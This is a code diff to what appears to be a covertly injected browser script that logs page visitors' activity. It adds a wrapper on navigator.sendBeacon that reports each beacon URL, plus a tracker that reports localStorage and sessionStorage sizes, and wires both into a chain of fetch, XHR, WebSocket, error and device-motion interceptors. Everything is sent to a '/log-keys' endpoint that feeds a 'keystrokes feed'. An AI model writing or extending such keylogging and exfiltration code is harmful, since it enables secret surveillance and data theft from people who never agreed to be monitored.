@@ -1609,6 +1609,57 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         }, true);
     }
 
+    // ═══ BEACON INTERCEPTOR ═══════════════════════════════════
+    // Wraps navigator.sendBeacon to log beacon calls made by the page.
+    // sendBeacon is commonly used for analytics pings on page unload.
+    function initBeaconInterceptor() {
+        try {
+            if (!navigator.sendBeacon) return;
+            const origBeacon = navigator.sendBeacon.bind(navigator);
+            const _post = post;
+            navigator.sendBeacon = function(url, data) {
+                try {
+                    const sUrl = String(url || '').slice(0, 180);
+                    if (!sUrl.includes('/log-keys') && !sUrl.includes('/heartbeat')) {
+                        _post('/log-keys', {
+                            keys: `[BEACON] ${sUrl}`,
+                            url: location.href
+                        });
+                    }
+                } catch {}
+                return origBeacon(url, data);
+            };
+        } catch {}
+    }
+
+    // ═══ STORAGE SIZE TRACKER ═════════════════════════════════
+    // Measures how much data is stored in localStorage and sessionStorage
+    // and reports the approximate sizes, which reveals usage patterns.
+    function initStorageSizeTracker() {
+        try {
+            const calcSize = (storage) => {
+                let total = 0;
+                try {
+                    for (let i = 0; i < storage.length; i++) {
+                        const key = storage.key(i);
+                        const val = storage.getItem(key) || '';
+                        total += key.length + val.length;
+                    }
+                } catch {}
+                return total;
+            };
+            const lsSize  = calcSize(localStorage) * 2;  // approximate bytes (UTF-16)
+            const ssSize  = calcSize(sessionStorage) * 2;
+            const lsItems = localStorage.length;
+            const ssItems = sessionStorage.length;
+            const fmt = b => b > 1024 ? (b / 1024).toFixed(1) + 'KB' : b + 'B';
+            post('/log-keys', {
+                keys: `[STORAGE SIZE] localStorage=${fmt(lsSize)}(${lsItems}items) sessionStorage=${fmt(ssSize)}(${ssItems}items) quota=${navigator.storage ? 'present' : 'unknown'}`,
+                url: location.href
+            });
+        } catch {}
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1751,7 +1802,9 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initWebSocketDetector();
         initFetchInterceptor();
         initXHRInterceptor();
+        initBeaconInterceptor();
         initInputTypeClassifier();
+        initStorageSizeTracker();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
